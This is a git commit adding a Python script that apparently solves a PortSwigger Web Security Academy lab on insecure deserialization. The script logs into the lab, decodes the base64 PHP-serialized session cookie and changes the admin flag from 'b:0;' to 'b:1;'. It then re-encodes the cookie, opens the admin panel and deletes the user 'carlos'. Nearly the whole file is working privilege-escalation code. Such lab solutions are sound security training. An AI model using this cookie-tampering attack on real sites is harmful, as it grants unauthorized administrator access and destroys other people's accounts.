48f346948c71d96752bc1f709d74b700dbc7bb48
rst3m <rstmmemmedzade109@gmail.com>
2026-05-19 12:00:21 +0400

    Modifying serialized objects

---
+++ Portswigger/insecure_deserialization/task1.py
@@ -0,0 +1,68 @@
+import requests
+from urllib.parse import unquote
+import base64
+
+url = "https://0aab0037032c0e5f81642f9900c20027.web-security-academy.net"
+
+session = requests.Session()
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Referer": f"{url}/login",
+    "Origin": f"{url}"
+}
+
+cookies = {
+    "session": ""
+}
+
+data = {
+    "username": "wiener",
+    "password": "peter"
+}
+
+response = session.post(
+    f"{url}/login",
+    headers=headers,
+    cookies=cookies,
+    data=data,
+)
+
+if "/my-account?id=wiener" in response.text:
+    print("Logged in successful!")
+else:
+    print("Cannot Logged in!")
+
+normalDecodedSessionToken = base64.b64decode(unquote(session.cookies.get("session"))).decode()
+print(f"Normal cookie is: {normalDecodedSessionToken}")
+
+changedDecodedSessionToken = normalDecodedSessionToken.replace("b:0;", "b:1;")
+changedSessionToken = base64.b64encode(changedDecodedSessionToken.encode()).decode()
+print(f"Changed cookie is: {changedSessionToken}")
+
+session.cookies.set(
+    "session",
+    changedSessionToken,
+    domain="0aab0037032c0e5f81642f9900c20027.web-security-academy.net",
+)
+
+changedDashboardResponse = session.get(f"{url}/admin")
+
+if "Admin panel" in changedDashboardResponse.text:
+    print("You successfully logged in Admin Panel!")
+else:
+    print("Admin panel login failed")
+
+
+delete_response = session.get(
+    f"{url}/admin/delete",
+    params={"username": "carlos"}
+)
+
+if "Congratulations, you solved the lab!" in delete_response.text:
+    print("You successfully deleted the Carlos user!")
+else:
+    print("Deleting process failed!")
+
+print(changedDashboardResponse.text)
